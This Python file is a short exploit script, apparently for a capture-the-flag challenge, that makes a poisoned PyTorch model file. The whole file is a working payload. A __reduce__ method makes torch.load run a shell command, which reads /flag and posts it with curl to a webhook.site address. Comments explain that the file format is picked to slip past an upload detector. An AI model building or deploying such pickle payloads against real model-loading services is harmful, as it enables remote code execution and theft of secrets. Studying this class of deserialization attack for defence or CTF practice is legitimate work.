import torch
import torch.nn as nn
import subprocess
import sys
import os

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

class Malicious(object):
    def __reduce__(self):
        # Use subprocess.Popen with shell=True for maximum compatibility
        return (subprocess.Popen, (CMD, ), {"shell": True})

# Create a dummy model structure
# The server code does:
# model = models.resnet50()
# model.fc = nn.Linear(...)
# model.load_state_dict(torch.load(path))

# If torch.load returns a Malicious object, it will be executed during load.
# We don't care if load_state_dict fails afterwards.

if __name__ == "__main__":
    # We use torch.save to create a ZIP-compressed PyTorch file.
    # This matches the expected .pth format and likely fixes the "broken detector" issue
    # which might have been caused by uploading raw pickle files.
    filename = "nailong_payload_v9.pth"
    
    # We save the Malicious object directly.
    # When torch.load() deserializes it, it triggers __reduce__.
    torch.save(Malicious(), filename)
    
    print(f"[+] Generated {filename} (ZIP format)")
